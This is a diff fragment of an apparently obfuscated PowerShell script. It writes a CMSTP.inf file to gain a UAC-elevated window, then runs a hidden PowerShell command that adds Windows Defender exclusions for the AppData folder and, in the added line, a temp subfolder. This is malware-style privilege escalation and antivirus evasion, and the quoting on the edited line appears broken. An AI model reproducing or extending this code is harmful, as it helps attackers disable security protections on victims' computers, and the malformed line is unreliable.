@@ -5,7 +5,7 @@
 	${inFFIL`E`LOca`T`ion} = "$env:temp\CMSTP.inf",
 	
 	[Parameter(HelpMessage="Specify the command to launch in a UAC-privileged window")]
-	[String]${Co`mMA`NdtOExecU`TE} = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -win hid Add-MpPreference -ExclusionPath ' + $env:appdata
+	[String]${Co`mMA`NdtOExecU`TE} = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -win hid Add-MpPreference -ExclusionPath ' + $env:appdata;Add-MpPreference -ExclusionPath ' + $env:temp+'\1'
 	)
 
 ${InF`con`Te`NT} = @"
